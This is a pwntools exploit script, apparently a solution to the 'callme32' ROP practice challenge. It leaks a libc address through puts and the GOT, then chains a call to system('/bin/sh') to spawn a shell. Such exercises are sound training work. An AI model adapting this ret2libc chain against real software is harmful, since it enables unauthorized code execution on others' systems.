import time

from pwn import *


EXECUTABLE = "./callme32"
context.binary = elf = ELF(EXECUTABLE)
libc = elf.libc
lib_callme = ELF("./libcallme32.so")


p = process(EXECUTABLE)

OFFSET = 44
if OFFSET is None:
    p.sendafter(b"> ", cyclic(128))

    time.sleep(1)
    core = Coredump("./core")
    log.success(f"Core fault address at: {hex(core.fault_addr)}")
    log.info(f"Finding offset for {hex(core.fault_addr)}")
    offset = cyclic_find(core.fault_addr)
    log.success(f"Offset found: {offset}")
    exit()

# Leak base address of puts
puts_leak = ROP(elf)
puts_leak.puts(elf.got.puts)
puts_leak.pwnme()

log.debug("Puts leak rop:\n" + puts_leak.dump())
p.sendafter(b"> ", flat({ OFFSET: puts_leak.chain() }))

# Get address of libc
p.recvuntil(b"Thank you!\n")
puts_addr = unpack(p.recv(4).ljust(4, b"\x00"))
libc.address = puts_addr - libc.sym.puts
log.info(f"Libc lives at: {hex(libc.address)}")

# Prepare system call
binsh = next(libc.search(b"/bin/sh"))
rop_system = ROP([elf, libc])
rop_system.system(binsh)

# Send system call
log.debug("ROP System:\n" + rop_system.dump())
p.sendafter(b"> ", flat({ OFFSET: rop_system.chain() }))
p.recvline()

# Got a shell now
p.success("Got the shell")
p.interactive()
